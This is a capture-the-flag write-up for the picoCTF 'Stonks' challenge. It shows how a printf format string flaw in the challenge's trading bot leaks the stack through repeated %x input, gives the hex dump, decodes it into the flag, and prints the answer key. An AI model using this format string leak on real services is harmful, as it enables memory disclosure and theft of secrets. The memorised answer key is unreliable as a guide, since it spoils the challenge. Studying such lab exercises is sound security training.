Author: madStacks

#### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

#### Solution
`telnet mercurity.picoctf.net 6989`
```
Connected to mercury.picoctf.net.
Escape character is '^]'.
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```
Try both options 1 and 2.

Download the `vuln.c` file and look at it. 

Looking at the `buy_stonks` function, in the `// TODO` section, we see that we are using printf without specifically mentioning a data type to use.  So we can specify the datatype to print out, or we can print stack information using `%x`

We can continue to dump the stack repeatedly by using mutliple `%x`

```
Buying stonks with token:
94a53b0804b00080489c3f7f7bd80ffffffff194a3160f7f89110f7f7bdc7094a4180194a539094a53b06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533ffb9007df7fb6af8f7f8944054f0c00010f7e18ce9f7f8a0c0f7f7b5c0f7f7b000ffb9c4d8f7e0968df7f7b5c08048ecaffb9c4e40f7f9df09804b000f7f7b000f7f7be20ffb9c518f7fa3d50f7f7c89054f0c000f7f7b000804b000ffb9c5188048c8694a3160ffb9c504ffb9c5188048be9f7f7b3fc0ffb9c5ccffb9c5c41194a316054f0c000ffb9c53000f7dbefa1f7f7b000f7f7b0000f7dbefa11ffb9c5c4ffb9c5ccffb9c55410f7f7b000f7f9e70af7fb60000f7f7b000002815f67c6d5f977000180486300f7fa3d50f7f9e960804b00018048630080486628048b851ffb9c5c48048cd08048d30f7f9e960ffb9c5bcf7fb69401ffb9de770ffb9deb0ffb9debdffb9dec6ffb9def5ffb9df2dffb9df48ffb9df6bffb9df73020f7f8eb5021f7f8e000101f8bfbff61000116438048034420597f7f8f0008098048630b413c413d414e41417
```

Adding this to cyberchef to convert from Hex we can see the string but the letters are out of order.  Change the endiness from big to little, and remove some of the starting characters we can see the flag revealed

Answer: `picoCTF{I_l05t_4ll_my_m0n3y_0a853e52}`